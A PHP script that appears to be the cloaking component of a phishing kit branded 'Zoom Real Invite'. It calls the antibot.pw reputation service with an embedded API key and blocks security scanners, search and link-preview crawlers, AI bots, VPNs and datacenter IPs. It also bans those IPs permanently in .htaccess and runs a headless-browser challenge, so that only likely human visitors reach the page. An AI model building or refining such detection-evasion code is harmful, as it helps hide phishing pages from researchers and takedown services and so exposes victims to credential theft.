<?php
/**
 * ╔══════════════════════════════════════════════════════════════════╗
 * ║   ANTI-BOT PROTECTION — Zoom Real Invite  (cPanel standalone)   ║
 * ║   Powered by antibot.pw API  +  JS Browser Challenge  v3        ║
 * ╚══════════════════════════════════════════════════════════════════╝
 * Layers:
 *  1. .htaccess     — server-level UA/IP block (before PHP)
 *  2. UA blacklist  — instant kill for obvious bots
 *  3. Header check  — missing Accept/Accept-Language = bot
 *  4. Cookie check  — already verified? skip everything
 *  5. Rate limit    — > 20 unverified hits / 2 min = block
 *  6. antibot.pw    — IP reputation: proxy/VPN/datacenter/bot
 *                     → confirmed bots get permanently banned in .htaccess
 *  7. JS challenge  — SHA-256 proof-of-work + headless detection
 */

// ── antibot.pw Config ─────────────────────────────────────────────────────────
define('AB_PW_APIKEY',      '2bd44f1dfb8917dd3f67eaec42ff27bc');
define('AB_PW_BLOCKERS_URL','https://antibot.pw/api/v2-blockers');
define('AB_PW_MANAGER_URL', 'https://antibot.pw/api/v2-manager');
define('AB_PW_KEYNAME',     '');          // ← fill your Manager keyname if you have one
define('AB_PW_CACHE_TTL',   300);         // 5 min cache per IP
define('AB_PW_CACHE_DIR',   __DIR__ . '/data/cache');

// ── Local Config ──────────────────────────────────────────────────────────────
// php_uname() is disabled on many shared hosts — safe fallback
$_ab_node = 'shared';
if (function_exists('php_uname')) {
    $disabled = array_map('trim', explode(',', ini_get('disable_functions') ?: ''));
    if (!in_array('php_uname', $disabled)) $_ab_node = @php_uname('n') ?: gethostname() ?: 'shared';
} elseif (function_exists('gethostname')) {
    $_ab_node = gethostname() ?: 'shared';
}
define('AB_SECRET',      'zri_ab3_' . md5(__FILE__ . $_ab_node));
unset($_ab_node);

define('AB_COOKIE',      '_zck');
define('AB_EXPIRY',      3600);           // cookie TTL: 1 hour
define('AB_RATE_FILE',   __DIR__ . '/data/rate.json');
define('AB_MAX_HITS',    20);             // max unverified hits before block
define('AB_RATE_WINDOW', 120);            // per 2 minutes
define('AB_BAN_START',   '# ANTIBOT_BANS_START');
define('AB_BAN_END',     '# ANTIBOT_BANS_END');

// Ensure cache directory exists
if (!is_dir(AB_PW_CACHE_DIR)) @mkdir(AB_PW_CACHE_DIR, 0755, true);

// ── Known Bot UA Patterns ─────────────────────────────────────────────────────
$_AB_BOT_UA = [
    'bot','spider','crawl','scrape','scan','slurp','archiver','fetch',
    'wget','curl','libwww','python-requests','python-urllib',
    'aiohttp','httpx','urllib3','axios','node-fetch','got ','okhttp',
    'java/','go-http','ruby','guzzle','faraday','scrapy','httparty',
    'headlesschrome','headlessfirefox','phantomjs','selenium','webdriver',
    'puppeteer','playwright','cypress','nightmare','casperjs','zombie',
    'googlebot','bingbot','yahoo! slurp','duckduckbot','baiduspider',
    'yandexbot','sogou','exabot','ia_archiver','ahrefsbot','semrushbot',
    'dotbot','mj12bot','blexbot','petalbot','bytespider',
    'gptbot','chatgpt-user','claudebot','ccbot','anthropic-ai','cohere-ai',
    'facebookexternalhit','twitterbot','linkedinbot','whatsapp',
    'telegrambot','discordbot','slackbot','embedly','rogerbot',
    'nmap','nikto','sqlmap','masscan','zgrab','nuclei','dirbuster',
    'wfuzz','gobuster','feroxbuster','postman','insomnia','httpie',
];

// ── Helpers ───────────────────────────────────────────────────────────────────
function ab_ip() {
    foreach (['HTTP_CF_CONNECTING_IP','HTTP_X_FORWARDED_FOR','HTTP_CLIENT_IP','REMOTE_ADDR'] as $k) {
        if (!empty($_SERVER[$k])) {
            $ip = trim(explode(',', $_SERVER[$k])[0]);
            if (filter_var($ip, FILTER_VALIDATE_IP)) return $ip;
        }
    }
    return '0.0.0.0';
}
function ab_ua()         { return $_SERVER['HTTP_USER_AGENT'] ?? ''; }
function ab_sign($d)     { return hash_hmac('sha256', $d, AB_SECRET); }
function ab_is_local($ip){ return in_array($ip, ['127.0.0.1','::1','0.0.0.0']) ||
    !filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE|FILTER_FLAG_NO_RES_RANGE); }

// ── antibot.pw API ────────────────────────────────────────────────────────────
function abpw_call($ip, $ua, $useManager = false) {
    if (!is_dir(AB_PW_CACHE_DIR)) @mkdir(AB_PW_CACHE_DIR, 0755, true);

    $cacheKey = AB_PW_CACHE_DIR . '/' . md5($ip . $ua . ($useManager ? 'mgr' : 'blk')) . '.json';
    $now      = time();

    // Serve from cache if fresh
    if (file_exists($cacheKey)) {
        $cached = @json_decode(@file_get_contents($cacheKey), true);
        if ($cached && isset($cached['_cached_at']) && ($now - $cached['_cached_at']) < AB_PW_CACHE_TTL) {
            return $cached;
        }
    }

    // Build URL
    $encodedUA = urlencode($ua);
    if ($useManager && AB_PW_KEYNAME !== '') {
        $url = AB_PW_MANAGER_URL
             . '?ip='      . urlencode($ip)
             . '&keyname=' . urlencode(AB_PW_KEYNAME)
             . '&apikey='  . AB_PW_APIKEY
             . '&ua='      . $encodedUA;
    } else {
        $url = AB_PW_BLOCKERS_URL
             . '?ip='     . urlencode($ip)
             . '&apikey=' . AB_PW_APIKEY
             . '&ua='     . $encodedUA;
    }

    // Call API — prefer curl, fallback to file_get_contents
    $result = null;
    if (function_exists('curl_init')) {
        $ch = @curl_init($url);
        if ($ch) {
            curl_setopt_array($ch, [
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_CONNECTTIMEOUT => 2,
                CURLOPT_TIMEOUT        => 3,
                CURLOPT_SSL_VERIFYPEER => false,
                CURLOPT_USERAGENT      => 'AntibotProtect/3.0',
            ]);
            $resp = @curl_exec($ch);
            @curl_close($ch);
            if ($resp) $result = @json_decode($resp, true);
        }
    }
    if (!$result) {
        // file_get_contents fallback
        $ctx  = @stream_context_create(['http' => ['timeout' => 4, 'user_agent' => 'AntibotProtect/3.0']]);
        $resp = @file_get_contents($url, false, $ctx);
        if ($resp) $result = @json_decode($resp, true);
    }

    if ($result) {
        $result['_cached_at'] = $now;
        @file_put_contents($cacheKey, json_encode($result), LOCK_EX);
    }
    return $result;
}

function abpw_should_block($ip, $ua) {
    $data = abpw_call($ip, $ua, AB_PW_KEYNAME !== '');
    if (!$data) return false; // API down → fail open

    $blockReason = '';
    if (!empty($data['block_access'])) {
        $blockReason = $data['block_by'] ?? 'Blocked by antibot.pw';
    } elseif (!empty($data['is_bot'])) {
        $blockReason = 'Detected as bot';
    }
    return $blockReason ?: false; // returns reason string or false
}

function abpw_get_ipinfo($ip, $ua) {
    $data = abpw_call($ip, $ua);
    if ($data && isset($data['info']['ipinfo'])) return $data['info']['ipinfo'];
    return null;
}
function antibot_get_visitor_info() { return abpw_get_ipinfo(ab_ip(), ab_ua()); }

// ── Permanent IP Ban via .htaccess ────────────────────────────────────────────
function ab_ban_ip($ip) {
    if (ab_is_local($ip)) return;
    $f = __DIR__ . '/.htaccess';
    if (!is_writable($f)) return;
    $c = @file_get_contents($f);
    if ($c === false || strpos($c, $ip) !== false) return;
    $ban = "\nRewriteCond %{REMOTE_ADDR} ^" . str_replace('.', '\\.', $ip) . "$\nRewriteRule .* - [F,L]";
    if (strpos($c, AB_BAN_END) !== false) {
        $c = str_replace(AB_BAN_END, $ban . "\n" . AB_BAN_END, $c);
    } else {
        $c .= "\n" . AB_BAN_START . $ban . "\n" . AB_BAN_END . "\n";
    }
    @file_put_contents($f, $c, LOCK_EX);
}

// ── UA Bot Check ──────────────────────────────────────────────────────────────
function ab_is_bot_ua() {
    global $_AB_BOT_UA;
    $ua = strtolower(ab_ua());
    if (strlen($ua) < 10) return true;
    foreach ($_AB_BOT_UA as $p) if (strpos($ua, $p) !== false) return true;
    return false;
}

// ── Header Check ──────────────────────────────────────────────────────────────
function ab_headers_ok() {
    return !empty($_SERVER['HTTP_ACCEPT']) && !empty($_SERVER['HTTP_ACCEPT_LANGUAGE']);
}

// ── Rate Limiting ─────────────────────────────────────────────────────────────
function ab_rate_ok($ip) {
    $now  = time();
    $data = [];
    if (file_exists(AB_RATE_FILE)) {
        $raw = @file_get_contents(AB_RATE_FILE);
        if ($raw) $data = @json_decode($raw, true) ?: [];
    }
    foreach ($data as $k => $v) if ($now - $v['first'] > AB_RATE_WINDOW) unset($data[$k]);
    $data[$ip] = isset($data[$ip])
        ? ['count' => $data[$ip]['count'] + 1, 'first' => $data[$ip]['first']]
        : ['count' => 1, 'first' => $now];
    @file_put_contents(AB_RATE_FILE, json_encode($data), LOCK_EX);
    return $data[$ip]['count'] <= AB_MAX_HITS;
}

// ── Clearance Cookie ──────────────────────────────────────────────────────────
function ab_cookie_valid() {
    if (!isset($_COOKIE[AB_COOKIE])) return false;
    $p = explode('.', $_COOKIE[AB_COOKIE]);
    if (count($p) !== 3) return false;
    [$ts, $token, $sig] = $p;
    if ((time() - intval($ts)) > AB_EXPIRY) return false;
    return hash_equals(ab_sign($ts . $token . ab_ip() . strtolower(ab_ua())), $sig);
}
function ab_set_cookie($token) {
    $ts  = time();
    $sig = ab_sign($ts . $token . ab_ip() . strtolower(ab_ua()));
    $secure = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off');
    setcookie(AB_COOKIE, $ts . '.' . $token . '.' . $sig, time() + AB_EXPIRY, '/', '', $secure, true);
}

// ── Challenge verification ────────────────────────────────────────────────────
function ab_new_challenge() {
    $seed = bin2hex(random_bytes(16));
    $ts   = time();
    $sig  = ab_sign('ch:' . $seed . ':' . $ts);
    return ['seed' => $seed, 'ts' => $ts, 'sig' => $sig];
}
function ab_verify_challenge($token, $seed, $ts, $sig) {
    if (!hash_equals(ab_sign('ch:' . $seed . ':' . $ts), $sig)) return false;
    if ((time() - intval($ts)) > 300) return false;
    return hash_equals(hash('sha256', $seed . $ts), $token);
}

// ── 403 Page ──────────────────────────────────────────────────────────────────
function ab_403_page($reason = '') {
    http_response_code(403);
    $r = $reason ? '<p style="color:#9ca3af;font-size:.8em;margin-top:10px">' . htmlspecialchars($reason, ENT_QUOTES) . '</p>' : '';
    die('<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>403 Forbidden</title>
<style>*{margin:0;padding:0;box-sizing:border-box}
body{background:#0a0a0f;min-height:100vh;display:flex;align-items:center;justify-content:center;
font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Arial,sans-serif}
.c{text-align:center;padding:60px 40px;max-width:440px}
h1{color:#ef4444;font-size:1.8em;font-weight:700;margin:20px 0 12px}
p{color:#6b7280;font-size:.9em;line-height:1.7}
.code{margin-top:24px;color:#374151;font-size:.72em;font-family:monospace;
background:#111;padding:8px 14px;border-radius:6px;display:inline-block}
</style></head><body><div class="c">
<div style="font-size:64px">&#x26D4;</div>
<h1>Access Denied</h1>
<p>Your connection has been blocked.</p>
<p>Automated bots, proxies, and VPNs are not permitted.</p>' . $r . '
<div class="code">Error 403 &mdash; Forbidden</div>
</div></body></html>');
}

// ── JS Challenge Page ─────────────────────────────────────────────────────────
function ab_challenge_page($c) {
    $seed = htmlspecialchars($c['seed'], ENT_QUOTES);
    $ts   = (int)$c['ts'];
    $sig  = htmlspecialchars($c['sig'],  ENT_QUOTES);
    http_response_code(200);
    header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
    header('Pragma: no-cache');
    header('Content-Type: text/html; charset=UTF-8');
    die('<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Checking your browser&#8230;</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#0a0a0f;min-height:100vh;display:flex;align-items:center;justify-content:center;
font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Arial,sans-serif;color:#e8eaf6}
.wrap{text-align:center;padding:40px 20px;max-width:380px}
.shield{font-size:52px;margin-bottom:20px}
.ring{width:56px;height:56px;border:3px solid rgba(79,142,247,.15);
border-top:3px solid #4f8ef7;border-radius:50%;
animation:spin .85s linear infinite;margin:0 auto 24px}
@keyframes spin{to{transform:rotate(360deg)}}
h2{font-size:1.2em;font-weight:500;margin-bottom:10px}
p{color:#6b7280;font-size:.875em;line-height:1.6}
.bar{width:220px;height:3px;background:rgba(79,142,247,.15);border-radius:3px;margin:22px auto 0;overflow:hidden}
.bar-fill{height:100%;width:0%;background:#4f8ef7;border-radius:3px;animation:ld 2s ease-in-out forwards}
@keyframes ld{0%{width:0%}60%{width:70%}100%{width:100%}}
.dot{display:inline-block;width:5px;height:5px;background:#4f8ef7;border-radius:50%;
margin:0 3px;animation:bl 1.2s infinite}
.dot:nth-child(2){animation-delay:.2s}.dot:nth-child(3){animation-delay:.4s}
@keyframes bl{0%,80%,100%{opacity:.3;transform:scale(1)}40%{opacity:1;transform:scale(1.3)}}
</style></head><body>
<div class="wrap">
<div class="shield">&#x1F6E1;&#xFE0F;</div>
<div class="ring"></div>
<h2>Checking your browser<span class="dot"></span><span class="dot"></span><span class="dot"></span></h2>
<p>Verifying your connection is secure.<br>This takes just a moment.</p>
<div class="bar"><div class="bar-fill"></div></div>
</div>
<form id="_f" method="POST" style="display:none">
<input type="hidden" name="__ab_seed"  value="' . $seed . '">
<input type="hidden" name="__ab_ts"    value="' . $ts . '">
<input type="hidden" name="__ab_sig"   value="' . $sig . '">
<input type="hidden" name="__ab_token" id="__ab_t">
<input type="hidden" name="__ab_check" value="1">
</form>
<script>
!function(){"use strict";
var T0=Date.now();
function isSuspicious(){
  try{
    if(navigator.webdriver)return true;
    if(window.callPhantom||window._phantom||window.phantom)return true;
    if(window.__nightmare)return true;
    if(window.Buffer)return true;
    if(document.documentElement.getAttribute("webdriver"))return true;
    if(!navigator.languages||!navigator.languages.length)return true;
    if(/HeadlessChrome|HeadlessFirefox/i.test(navigator.userAgent))return true;
    if(window.document.$cdc_asdjflasutopfhvcZLmcfl_)return true;
    if(window.document.__selenium_unwrapped)return true;
    if(window.__cdc_asdjflasutopfhvcZLmcfl_Promise)return true;
    if(typeof window.outerWidth==="undefined"||window.outerWidth===0)return true;
  }catch(e){}
  return false;}
function sha256(msg){
  function rr(v,a){return(v>>>a)|(v<<(32-a));}
  var MP=Math.pow,MW=MP(2,32),H=[],K=[],pc=0,nc={};
  for(var c=2;pc<64;c++){
    if(!nc[c]){for(var i=0;i<313;i+=c)nc[i]=c;H[pc]=(MP(c,.5)*MW)|0;K[pc++]=(MP(c,1/3)*MW)|0;}}
  msg+="\x80";while(msg.length%64-56)msg+="\x00";
  var W=[],abl=arguments[0].length*8;
  for(var i=0;i<msg.length;i++){var j=msg.charCodeAt(i);if(j>>8)return"";W[i>>2]|=j<<((3-i)%4)*8;}
  W[W.length]=((abl/MW)|0);W[W.length]=abl;
  for(var j=0;j<W.length;){
    var w=W.slice(j,j+=16),oh=H.slice(0);
    for(var i=0;i<64;i++){
      var w15=w[i-15],w2=w[i-2],a=oh[0],e=oh[4];
      var t1=oh[7]+(rr(e,6)^rr(e,11)^rr(e,25))+((e&oh[5])^(~e&oh[6]))+K[i]+
             (w[i]=(i<16)?w[i]:(w[i-16]+(rr(w15,7)^rr(w15,18)^(w15>>>3))+w[i-7]+(rr(w2,17)^rr(w2,19)^(w2>>>10)))|0);
      var t2=(rr(a,2)^rr(a,13)^rr(a,22))+((a&oh[1])^(a&oh[2])^(oh[1]&oh[2]));
      for(var i2=7;i2>0;i2--)oh[i2]=oh[i2-1];oh[0]=(t1+t2)|0;oh[4]=(oh[4]+t1)|0;}
    for(var i=0;i<8;i++)H[i]=(H[i]+oh[i])|0;}
  var r="";for(var i=0;i<8;i++)for(var j=3;j+1;j--){var b=(H[i]>>(j*8))&255;r+=((b<16)?"0":"")+b.toString(16);}
  return r;}
function finish(){
  var elapsed=Date.now()-T0;
  if(elapsed<400){setTimeout(finish,400-elapsed);return;}
  var seed=document.querySelector("[name=__ab_seed]").value;
  var ts=document.querySelector("[name=__ab_ts]").value;
  var token=isSuspicious()?"blocked_headless_"+Math.random().toString(36).slice(2):sha256(seed+ts);
  document.getElementById("__ab_t").value=token;
  document.getElementById("_f").submit();}
setTimeout(finish,500+Math.floor(Math.random()*300));
}();
</script></body></html>');
}

// ── MAIN PROTECT (HTML pages) ─────────────────────────────────────────────────
function antibot_protect() {
    $ip = ab_ip();
    $ua = ab_ua();

    // 1. Bot UA — instant kill
    if (ab_is_bot_ua()) {
        ab_ban_ip($ip);
        ab_403_page('Blocked: known bot signature');
    }

    // 2. Missing headers — instant kill
    if (!ab_headers_ok()) {
        ab_403_page('Blocked: invalid request headers');
    }

    // 3. Cookie valid → let through immediately (no rate/API checks)
    if (ab_cookie_valid()) return;

    // 4. Rate limit (only unverified visitors)
    if (!ab_rate_ok($ip)) {
        ab_403_page('Blocked: too many requests');
    }

    // 5. antibot.pw IP reputation (skip localhost/private IPs)
    if (!ab_is_local($ip)) {
        $blockReason = abpw_should_block($ip, $ua);
        if ($blockReason) {
            ab_ban_ip($ip);   // permanent .htaccess ban
            ab_403_page($blockReason);
        }
    }

    // 6. Process JS challenge POST
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['__ab_check'])) {
        $token = trim($_POST['__ab_token'] ?? '');
        $seed  = trim($_POST['__ab_seed']  ?? '');
        $ts    = trim($_POST['__ab_ts']    ?? '');
        $sig   = trim($_POST['__ab_sig']   ?? '');

        if (ab_verify_challenge($token, $seed, $ts, $sig)) {
            ab_set_cookie($token);
            // Absolute URL redirect — prevents chrome-error frame issue
            $scheme = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
            $host   = $_SERVER['HTTP_HOST'] ?? 'localhost';
            $path   = strtok($_SERVER['REQUEST_URI'] ?? '/', '?');
            $qs     = !empty($_GET) ? '?' . http_build_query($_GET) : '';
            header('Location: ' . $scheme . '://' . $host . $path . $qs);
            exit;
        }
        ab_403_page('Blocked: challenge verification failed');
    }

    // 7. Issue JS challenge
    ab_challenge_page(ab_new_challenge());
}

// ── API PROTECT (AJAX endpoints — cookie check only, returns JSON) ────────────
function antibot_protect_api() {
    if (ab_is_bot_ua()) {
        header('Content-Type: application/json');
        http_response_code(403);
        echo json_encode(['ok' => false, 'error' => 'Forbidden']);
        exit;
    }
    if (!ab_cookie_valid()) {
        header('Content-Type: application/json');
        http_response_code(403);
        echo json_encode(['ok' => false, 'error' => 'Clearance required. Please refresh the page.']);
        exit;
    }
}
